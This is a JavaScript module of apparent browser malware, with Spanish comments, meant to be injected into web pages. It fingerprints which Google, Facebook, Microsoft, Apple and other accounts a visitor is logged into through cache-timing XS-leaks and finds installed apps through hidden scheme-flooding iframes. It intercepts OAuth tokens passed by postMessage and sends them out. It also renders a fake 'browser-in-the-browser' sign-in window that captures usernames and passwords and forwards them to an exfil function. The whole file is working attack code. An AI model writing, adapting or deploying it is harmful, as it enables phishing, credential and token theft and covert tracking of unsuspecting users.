/* m-sessions.js — Inteligencia + intercepción de sesiones third-party (Google, FB, IG, WhatsApp, X, Microsoft, Apple).
   HONESTO: NO roba cookies SameSite+HttpOnly (imposible desde web sin 0-day). Implementa lo alcanzable:
   (1) XS-Leaks: detecta EN QUÉ servicios está logueado el usuario (inteligencia de identidad).
   (2) Scheme flooding: detecta qué apps tiene instaladas (WhatsApp/IG/X/Zoom/...).
   (3) OAuth hook: intercepta tokens de flows Google/FB/Apple/Microsoft via postMessage.
   (4) Social embed detection: iframes de FB/IG/X/Google presentes (sesión activa).
   (5) BitB: ventana falsa del servicio detectado (captura creds on-demand). */
(function(G){
if(!G)return; if(G._M&&G._M.sess)return; G._M=G._M||{}; G._M.sess=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
var VID=(window.__GE_OFF__&&window.__GE_OFF__.id)||'anon';
var report={vid:VID,loc:location.pathname,ts:Date.now()};

// ─── 1. XS-LEAKS: detección de sesión logueada por servicio ───
// Oráculos: (a) cache probing (recurso cacheado = visitado/logueado), (b) img onerror timing,
// (c) fetch no-cors timing. No es 100% preciso (varía por servicio/mitigaciones) → reporta señales.
var SVC={
google:{host:'accounts.google.com',res:'https://accounts.google.com/favicon.ico',scheme:'google'},
facebook:{host:'www.facebook.com',res:'https://www.facebook.com/favicon.ico',scheme:'fb'},
instagram:{host:'www.instagram.com',res:'https://www.instagram.com/favicon.ico',scheme:'instagram'},
x:{host:'x.com',res:'https://abs.twimg.com/favicons/twitter.ico',scheme:'twitter'},
microsoft:{host:'login.live.com',res:'https://login.live.com/favicon.ico',scheme:'ms'},
apple:{host:'appleid.apple.com',res:'https://appleid.apple.com/favicon.ico',scheme:'appleid'},
github:{host:'github.com',res:'https://github.githubassets.com/favicons/favicon.svg',scheme:'github'},
linkedin:{host:'www.linkedin.com',res:'https://www.linkedin.com/favicon.ico',scheme:'linkedin'}
};
function probeCache(url){
return new Promise(function(res){
var t0=performance.now(),done=false;
var img=new Image();
var finish=function(hit){if(done)return;done=true;res({ms:Math.round(performance.now()-t0),hit:hit})};
img.onload=function(){finish(true)}; // cargo sin error
img.onerror=function(){finish(performance.now()-t0<60)}; // error rápido ≈ cacheado/reachable, lento ≈ bloqueado
img.src=url+'?_='+Math.random().toString(36).slice(2,8);
setTimeout(function(){finish(false)},3000);
});
}
function xsLeaks(){
var names=Object.keys(SVC);var out={};
var i=0;
(function next(){
if(i>=names.length){report.xsLeaks=out;phase3();return}
var n=names[i++];var s=SVC[n];
probeCache(s.res).then(function(r){out[n]={ms:r.ms,likely:r.hit,rating:r.hit?(r.ms<40?'high':'med'):'none'};next()});
})();
}

// ─── 2. SCHEME FLOODING: apps instaladas (whatsapp://, instagram://, etc.) ───
var SCHEMES=['whatsapp','instagram','twitter','fb','zoommtg','skype','steam','telegram','spotify','microsoft-edge','slack','discord','github'];
function schemeFlood(){
var apps={};
var pending=SCHEMES.length;
SCHEMES.forEach(function(sch){
var t0=performance.now(),done=false;
var chk=setTimeout(function(){if(!done){done=true;apps[sch]=false;if(--pending===0){report.apps=apps;phase3Done()}}},800);
try{
// iframe hidden al scheme; si la app existe, el navegador intenta lanzarla (blur/visibility o no-error rápido)
var ifr=document.createElement('iframe');
ifr.style.cssText='width:1px;height:1px;position:fixed;left:-9999px;top:-9999px;opacity:0;pointer-events:none';
ifr.onload=function(){if(!done){done=true;clearTimeout(chk);apps[sch]=(performance.now()-t0<100);if(--pending===0){report.apps=apps;phase3Done()}}};
ifr.src=sch+'://'+(sch==='whatsapp'?'send?text=x':'x');
(document.body||document.documentElement).appendChild(ifr);
setTimeout(function(){try{ifr.remove()}catch(e){}},1500);
}catch(e){if(!done){done=true;clearTimeout(chk);apps[sch]=false;if(--pending===0){report.apps=apps;phase3Done()}}}
});
// detección por window.blur (la app capta foco al abrirse)
var blurred=false;
document.addEventListener('blur',function(){blurred=true},{once:true});
setTimeout(function(){report.appBlur=blurred},1200);
}

// ─── 3. OAuth postMessage hook (Google/FB/Apple/Microsoft tokens) ───
var OA_RE=/(access_token|id_token|code|authorization|state|id_token=)/i;
var OA_ORIG=/accounts\.google\.com|facebook\.com|appleid\.apple\.com|login\.microsoftonline|login\.live\.com|twitter\.com|x\.com/i;
window.addEventListener('message',function(e){
try{
var d=e.data;var s=typeof d==='string'?d:JSON.stringify(d);
if(OA_RE.test(s)&&(OA_ORIG.test(e.origin)||OA_ORIG.test(s))){
exfil('sessions-oauth',{origin:e.origin.slice(0,60),data:s.slice(0,400),vid:VID});
}
}catch(err){}
});

// ─── 4. Social embed detection (iframes con sesión del usuario) ───
function embeds(){
var found={};
document.querySelectorAll('iframe').forEach(function(f){
var src=f.src||'';var m=src.match(/facebook\.com|instagram\.com|twitter\.com|x\.com|google\.com\/recaptcha|accounts\.google\.com|linkedin\.com|tiktok\.com/);
if(m&&!found[m[0]])found[m[0]]={src:src.slice(0,80),w:f.width,h:f.height};
});
report.embeds=Object.keys(found).length?found:{none:true};
}

// ─── 5. BitB phishing on-demand: ventana falsa del servicio ───
window.__GE__._bitb=window.__GE__._bitb||function(svc){
svc=svc||'google';
var T={google:{title:'Sign in - Google accounts',icon:'https://www.google.com/favicon.ico',brand:'#4285f4',placeholder:'Email or phone'},
microsoft:{title:'Sign in to your Microsoft account',icon:'https://account.microsoft.com/favicon.ico',brand:'#0078d4',placeholder:'Email, phone, or Skype'},
apple:{title:'Sign in with your Apple ID',icon:'https://appleid.apple.com/favicon.ico',brand:'#000',placeholder:'Apple ID'},
facebook:{title:'Log in to Facebook',icon:'https://www.facebook.com/favicon.ico',brand:'#1877f2',placeholder:'Email or phone number'}};
var t=T[svc]||T.google;
var ov=document.createElement('div');ov.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:-apple-system,sans-serif';
ov.innerHTML='<div style="background:#fff;border-radius:8px;padding:36px 40px;width:450px;box-shadow:0 2px 10px rgba(0,0,0,.3)"><img src="'+t.icon+'" style="width:24px;position:absolute;margin-left:-4px;margin-top:-12px"><h3 style="margin:0 0 24px;color:#202124;font-weight:400;font-size:24px">'+t.title+'</h3><input id="ge-bb-u" type="text" placeholder="'+t.placeholder+'" style="width:100%;padding:13px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:16px"><div id="ge-bb-pw" style="display:none"><input id="ge-bb-p" type="password" placeholder="Enter your password" style="width:100%;padding:13px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:16px"></div><button id="ge-bb-n" style="background:'+t.brand+';color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;float:right;cursor:pointer">Next</button></div>';
(document.body||document.documentElement).appendChild(ov);
function step(){var u=document.getElementById('ge-bb-u').value;if(!u)return;document.getElementById('ge-bb-pw').style.display='block';document.getElementById('ge-bb-n').textContent='Sign in';document.getElementById('ge-bb-n').onclick=function(){var p=document.getElementById('ge-bb-p').value;exfil('sessions-bitb',{svc:svc,user:u,pass:p,vid:VID});ov.remove()}}
document.getElementById('ge-bb-n').onclick=step;
ov.addEventListener('click',function(e){if(e.target===ov)ov.remove()});
};

// ─── coordina fases y reporta ───
var phaseDone={embeds:false,xs:false,apps:false};
embeds();
xsLeaks();
schemeFlood();
function phase3(){report.appsReady=true}
function phase3Done(){report.appsReady=true}
setTimeout(function(){
// seleccionar servicio para BitB sugerido (el más likely logueado)
var best=null,bestr=-1;
if(report.xsLeaks)for(var k in report.xsLeaks){var r=report.xsLeaks[k].rating;if(r==='high'&&SVC[k]){var sc=SVC[k].scheme;var map={google:'google',microsoft:'microsoft',apple:'apple',facebook:'facebook'};if(map[sc]&&2>bestr){bestr=2;best=map[sc]}}}
report.bitbSuggested=best;
exfil('sessions',report);
hx('sessions-boot',{vid:VID,services:report.xsLeaks?Object.keys(report.xsLeaks).length:0,apps:report.apps?Object.keys(report.apps).length:0,embeds:report.embeds?Object.keys(report.embeds).length:0,bitb:best});
},6000);
}catch(e){hx('m-sessions-err',{m:e.message})}
})(window.__GE__);
